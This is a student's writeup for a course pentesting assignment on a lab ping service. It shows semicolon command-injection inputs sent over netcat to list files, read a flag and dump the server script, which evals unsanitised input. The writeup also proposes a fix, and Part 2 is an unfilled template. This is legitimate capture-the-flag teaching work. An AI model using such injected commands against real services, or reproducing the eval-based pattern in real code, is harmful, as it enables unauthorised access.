# Writeup 2 - Pentesting

Name: Marco Roxas
Section: 0101

I pledge on my honor that I have not given or received any unauthorized assistance on this assignment or examination.

Digital acknowledgement: Marco Roxas

## Assignment Writeup

### Part 1 (45 pts)

By starting with an IP address to see the response and then experimenting with different inputs (especially the semicolon, which delimits a command and starts a new one) and corresponding responses, and because this assignment is about command line injection, it became apparent that the input was being run as part of the ping command. After some experiments the IP address was dropped and just the semicolon was typed and then the command. Some commands I tried were ls and whoami.

But it was odd at first because the connection would time out and it wasn't obvious that spaces were allowed in the input. I initially thought that only single keywords were allowed. So I tried various quote characters and double-dashes to get around to what I thought was a single-keyword limitation. Multiple commands were tried as well, separated by varying spaces, but with not much luck.

Fortunately I realized I could include spaces (which overcame a serious limitation) and was able to look in the /home directory and cat the flag.

Just by habit I tried ps aux and saw a script running. Not knowing what it was (I wanted to know what was in opt first) I did a find opt and cat the script, which showed how the ping script. It appears that this is the script behind the service, somehow the echo commands are redirected to the remote client and the read is taken from the client.

To address this vulnerability the input can be whitelisted as a valid ip address before running the ping command.

$ nc wattsamp.net 1337
~~~~ WATTSAMP ENERGY ~~~~
Network Administration Panel  --  Uptime Monitor
Enter IP address: ;ls           ;ls home

Ncat: Broken pipe.
$ nc wattsamp.net 1337
~~~~ WATTSAMP ENERGY ~~~~
Network Administration Panel  --  Uptime Monitor
Enter IP address: ;find home
home
home/flag.txt


Ncat: Broken pipe.
$ nc wattsamp.net 1337
~~~~ WATTSAMP ENERGY ~~~~
Network Administration Panel  --  Uptime Monitor
Enter IP address: ;cat home/flag.txt
Good! Here's your flag: CMSC389R-{p1ng_as_a_$erv1c3}


Ncat: Broken pipe.
$
at: Broken pipe.
$ nc wattsamp.net 1337
~~~~ WATTSAMP ENERGY ~~~~
Network Administration Panel  --  Uptime Monitor
Enter IP address: ;ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1 10.5  0.0  18376  2892 ?        Ss   17:11   0:00 /bin/bash /opt/container_startup.sh /bin/bash
root         7  0.0  0.0  18376  1832 ?        S    17:11   0:00 /bin/bash /opt/container_startup.sh /bin/bash
root         9  0.0  0.0  34400  2860 ?        R    17:11   0:00 ps aux


Ncat: Broken pipe.
$ nc wattsamp.net 1337
~~~~ WATTSAMP ENERGY ~~~~
Network Administration Panel  --  Uptime Monitor
Enter IP address: ;find opt
opt
opt/container_startup.sh


Ncat: Broken pipe.
$ nc wattsamp.net 1337
~~~~ WATTSAMP ENERGY ~~~~
Network Administration Panel  --  Uptime Monitor
Enter IP address: ;cat opt/c*
#!/bin/bash

function quit {
        exit
}

echo "~~~~ WATTSAMP ENERGY ~~~~"

echo "Network Administration Panel  --  Uptime Monitor "
echo -n "Enter IP address: "
read -t 5 input || quit
>&2 echo "[$(date)] INPUT: $input"

cmd="ping -w 5 -c 2 $input"
output=$(eval $cmd)

echo "$output"


Ncat: Broken pipe.


### Part 2 (55 pts)

*Please use this space to detail your approach and solutions for part 2. Don't forget to upload your completed source code to this /writeup directory as well!*
